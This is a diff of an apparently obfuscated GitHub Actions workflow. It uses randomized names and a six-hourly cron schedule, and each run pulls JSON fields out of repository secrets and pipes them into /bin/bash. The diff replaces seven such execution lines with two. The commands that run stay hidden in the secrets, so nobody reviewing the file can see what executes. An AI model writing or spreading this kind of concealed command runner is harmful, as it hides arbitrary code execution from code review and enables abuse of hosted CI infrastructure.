@@ -1,24 +1,17 @@
 name: surmiseblouse
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '14 2/6 * * *'
+    - cron: '46 5/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: surmiseblouse
         env:
-          wrod383: ${{ secrets.wrod383 }}
+          kjx98: ${{ secrets.kjx98 }}
         run: |
-          echo $wrod383 | jq -r .xxpm411 | /bin/bash
-          echo $cra9388 | jq -r .ncxvx950 | /bin/bash
-          echo $del2451 | jq -r .fgigj2 | /bin/bash
-          echo $bt9447 | jq -r .pcod020 | /bin/bash
-          echo $azjkl0 | jq -r .fox3547 | /bin/bash
-          echo $huxup78 | jq -r .o8 | /bin/bash
-          echo $db943 | jq -r .sqxd63 | /bin/bash
+          echo $kjx98 | jq -r .fm48513 | /bin/bash
+          echo $xjwnk78666 | jq -r .x525 | /bin/bash
 
